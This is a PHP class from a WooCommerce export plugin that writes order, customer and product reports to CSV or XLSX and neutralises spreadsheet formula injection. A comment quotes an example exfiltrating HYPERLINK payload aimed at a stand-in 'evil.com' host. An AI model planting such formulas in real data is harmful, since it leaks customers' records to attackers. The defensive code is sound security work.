<?php
/**
 * Export orchestrator: dispatches to a data class, writes a CSV or XLSX file.
 *
 * @package WooExports
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class Wooex_Exporter {

	public static int $last_row_count = 0;

	/**
	 * Run a report. Returns the absolute path of the generated file, or false on failure.
	 * After a successful or failed run, self::$last_row_count holds the row count.
	 */
	public static function run( array $report ) {
		self::$last_row_count = 0;

		// Large all-time exports can churn through tens of thousands of orders.
		// `wp_raise_memory_limit('admin')` lifts the limit to WP_MAX_MEMORY_LIMIT
		// (256M by default) without touching PHP-FPM workers serving other requests.
		if ( function_exists( 'wp_raise_memory_limit' ) ) {
			wp_raise_memory_limit( 'admin' );
		}

		$type    = (string) ( $report['type'] ?? '' );
		$format  = (string) ( $report['format'] ?? 'xlsx' );
		$filters = (array) ( $report['filters'] ?? [] );

		$rows = self::query_rows( $type, $filters );
		if ( null === $rows ) {
			error_log( '[WooExports] Export failed: unknown report type "' . $type . '"' );
			return false;
		}

		self::$last_row_count = count( $rows );

		if ( 'csv' !== $format && 'xlsx' !== $format ) {
			$format = 'xlsx';
		}

		if ( 'xlsx' === $format && ! class_exists( 'PhpOffice\\PhpSpreadsheet\\Spreadsheet' ) ) {
			error_log( '[WooExports] Export failed: PhpSpreadsheet not installed (run composer install in plugin dir).' );
			return false;
		}

		$dir = Wooex_Activator::ensure_export_dir();
		self::cleanup_old_files( $dir );

		$id    = (string) ( $report['id'] ?? Wooex_Report_Store::generate_id() );
		$stamp = wp_date( 'Y-m-d-Hi' );
		// 8-char cryptographic suffix — even if a server config gap exposes the
		// directory, URLs can't be enumerated without knowing this token.
		$rand  = wp_generate_password( 12, false, false );
		$path  = trailingslashit( $dir ) . sprintf(
			'wooexports-%s-%s-%s.%s',
			sanitize_file_name( $id ),
			$stamp,
			$rand,
			$format
		);

		$ok = ( 'csv' === $format )
			? self::write_csv( $rows, $path )
			: self::write_xlsx( $rows, $path, $type );

		return $ok ? $path : false;
	}

	private static function query_rows( string $type, array $filters ): ?array {
		switch ( $type ) {
			case 'products':
				return Wooex_Data_Products::get( $filters );
			case 'orders':
				return Wooex_Data_Orders::get( $filters );
			case 'customers':
				return Wooex_Data_Customers::get( $filters );
			case 'attendees':
				return Wooex_Data_Attendees::is_available() ? Wooex_Data_Attendees::get( $filters ) : [];
		}
		return null;
	}

	private static function write_csv( array $rows, string $path ): bool {
		$handle = @fopen( $path, 'wb' );
		if ( ! $handle ) {
			error_log( '[WooExports] CSV write failed: cannot open ' . $path );
			return false;
		}

		// UTF-8 BOM so Excel opens accented characters correctly.
		fwrite( $handle, "\xEF\xBB\xBF" );

		if ( empty( $rows ) ) {
			fclose( $handle );
			return true;
		}

		fputcsv( $handle, array_map( [ self::class, 'safe_cell' ], array_keys( $rows[0] ) ) );
		foreach ( $rows as $row ) {
			fputcsv( $handle, array_map( [ self::class, 'safe_cell' ], array_values( $row ) ) );
		}
		fclose( $handle );

		return true;
	}

	/**
	 * Defuse CSV / XLSX formula injection (CWE-1236).
	 *
	 * Any value beginning with =, +, -, @, tab, or carriage return is treated as
	 * a formula by Excel / LibreOffice / Numbers when the file is opened. A
	 * malicious customer can register with a name like
	 *   =HYPERLINK("https://evil.com/?x="&A1,"Click")
	 * and exfiltrate row data through the recipient's spreadsheet client. We
	 * neutralise by prepending a single-quote, which spreadsheet apps interpret
	 * as "treat as text" and strip on display.
	 *
	 * @param mixed $value
	 * @return string
	 */
	private static function safe_cell( $value ): string {
		if ( ! is_scalar( $value ) ) {
			return (string) $value;
		}
		$str = (string) $value;
		if ( '' === $str ) {
			return $str;
		}
		$first = $str[0];
		if ( '=' === $first || '+' === $first || '-' === $first || '@' === $first
			|| "\t" === $first || "\r" === $first ) {
			return "'" . $str;
		}
		return $str;
	}

	private static function write_xlsx( array $rows, string $path, string $type ): bool {
		$spreadsheet = new \PhpOffice\PhpSpreadsheet\Spreadsheet();
		$sheet       = $spreadsheet->getActiveSheet();
		$sheet->setTitle( ucfirst( $type ?: 'Export' ) );

		if ( ! empty( $rows ) ) {
			$headers = array_keys( $rows[0] );

			foreach ( $headers as $i => $header ) {
				$cell = \PhpOffice\PhpSpreadsheet\Cell\Coordinate::stringFromColumnIndex( $i + 1 ) . '1';
				// `setCellValueExplicit` with TYPE_STRING + safe_cell defuses any
				// would-be formula. PhpSpreadsheet would otherwise auto-detect
				// leading `=` as a real formula and store/evaluate it.
				$sheet->setCellValueExplicit(
					$cell,
					self::safe_cell( $header ),
					\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING
				);
			}
			$sheet->getStyle( '1:1' )->getFont()->setBold( true );

			$row_num = 2;
			foreach ( $rows as $row ) {
				foreach ( $headers as $i => $header ) {
					$cell  = \PhpOffice\PhpSpreadsheet\Cell\Coordinate::stringFromColumnIndex( $i + 1 ) . $row_num;
					$value = $row[ $header ] ?? '';
					$sheet->setCellValueExplicit(
						$cell,
						self::safe_cell( $value ),
						\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING
					);
				}
				$row_num++;
			}

			foreach ( $headers as $i => $_ ) {
				$letter = \PhpOffice\PhpSpreadsheet\Cell\Coordinate::stringFromColumnIndex( $i + 1 );
				$sheet->getColumnDimension( $letter )->setAutoSize( true );
			}
		}

		try {
			$writer = new \PhpOffice\PhpSpreadsheet\Writer\Xlsx( $spreadsheet );
			$writer->save( $path );
		} catch ( \Throwable $e ) {
			error_log( '[WooExports] XLSX write failed: ' . $e->getMessage() );
			return false;
		}

		return file_exists( $path );
	}

	/**
	 * Sweep export files older than 24 hours. Generated files are short-lived:
	 * successful email sends unlink immediately; on-demand downloads are streamed
	 * once and become stale on the next request. The 24h ceiling caps the
	 * exposure window if a file is left behind by a failed send or interrupted
	 * download.
	 */
	private static function cleanup_old_files( string $dir ): void {
		$cutoff = time() - DAY_IN_SECONDS;
		// Match both the current `wooexports-` prefix and the legacy `wooex-`
		// prefix (used pre-0.8.2) so files written by the previous version
		// still get swept after upgrade.
		$candidates = array_merge(
			(array) glob( trailingslashit( $dir ) . 'wooexports-*' ),
			(array) glob( trailingslashit( $dir ) . 'wooex-*' )
		);
		foreach ( $candidates as $file ) {
			if ( is_file( $file ) && filemtime( $file ) < $cutoff ) {
				@unlink( $file );
			}
		}
	}
}
